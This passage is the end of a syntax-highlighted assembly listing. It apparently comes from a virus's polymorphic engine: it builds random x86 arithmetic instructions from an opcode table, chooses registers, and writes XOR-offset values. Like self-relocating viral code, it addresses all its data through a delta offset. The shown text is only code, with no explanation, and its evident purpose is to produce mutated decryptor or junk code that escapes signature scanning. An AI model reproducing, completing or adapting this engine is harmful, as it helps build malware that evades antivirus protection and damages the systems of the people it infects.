</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_3BytesShit</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08bh</span><span class="sc0">   </span><span class="sc1">;mov reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">   </span><span class="sc1">;add reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02bh</span><span class="sc0">   </span><span class="sc1">;sub reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bh</span><span class="sc0">   </span><span class="sc1">;or  reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">023h</span><span class="sc0">   </span><span class="sc1">;and reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc0">   </span><span class="sc1">;xor reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">013h</span><span class="sc0">   </span><span class="sc1">;adc reg32,[mem]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01bh</span><span class="sc0">   </span><span class="sc1">;sbb reg32,[mem]</span><span class="sc0">
</span><span class="sc5">_lastShit1</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">@3bytes</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_3BytesShit</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;set instruction</span><span class="sc0">

</span><span class="sc5">@eouu</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">clc</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@random</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_lastShit</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@eouu</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_lastShit</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC1</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC1</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC1</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC1</span><span class="sc0">
          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@hmmm</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC1</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">@noDEC1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;choose register</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@hmmm</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@ESInow</span><span class="sc0">                    </span><span class="sc1">;the first one</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">       

</span><span class="sc5">@ESInow</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          
          </span><span class="sc6">stc</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@random</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorOffs</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">stosd</span><span class="sc0">
          
</span><span class="sc5">@noShit</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@hmmm</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@random</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@bleh</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'whooops'</span><span class="sc0">

</span><span class="sc5">@endOfIT</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">@start</span><span class="sc0">
</span></div></body>
</html>
